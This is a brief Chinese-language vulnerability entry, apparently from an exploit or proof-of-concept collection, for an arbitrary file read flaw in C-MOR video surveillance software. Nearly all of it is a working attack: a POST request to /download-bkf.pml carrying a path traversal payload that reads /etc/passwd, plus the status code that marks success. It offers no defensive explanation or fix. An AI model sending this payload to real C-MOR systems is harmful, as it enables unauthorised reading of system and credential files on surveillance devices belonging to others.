# C-MOR视频监控存在任意文件读取漏洞

C-MOR ｜ 任意文件读取/写入 ｜ —
- **请求**：`POST /download-bkf.pml HTTP/1.1`

**Payload**
```
bkf=../../../../etc/passwd
```
- **响应特征**：200